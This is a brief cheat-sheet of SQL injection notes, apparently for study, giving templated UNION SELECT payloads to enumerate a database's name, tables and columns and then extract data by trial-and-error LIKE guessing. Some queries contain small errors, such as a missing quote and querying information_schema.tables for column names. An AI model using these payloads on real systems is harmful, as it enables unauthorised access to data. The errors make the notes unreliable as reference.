SQL injection, also known as SQLI, is **a common attack vector that uses malicious SQL code for backend database manipulation to access information that was not intended to be displayed.**
# Useful Commands:

To try to get the database name: 

```sql
<wrong username> ' UNION SELECT <right number of columns> where database() like 'Try 
& error';--
```

After we get the database name, we can try to get the table name:

```sql
<wrong username> UNION SELECT <right number of columns> FROM information_schema.tables WHERE table_schema = 'The name of the database we found' and table_name like 'Try 
& error';--
```

After we get the table name, we can try to get the column name:

```sql
<wrong username> UNION SELECT <right number of columns> FROM information_schema.tables WHERE table_schema = 'The name of the database we found' and table_name like 'The name of the table we found' and COLUMN_NAME like 'Try & error';-- 
```

Finally it would like this:

```sql
<wrong username> UNION SELECT <right number of columns> from 'The name of the table we found without quotations' where 'The name of the column we found without quotations' like 'Try & error';--
```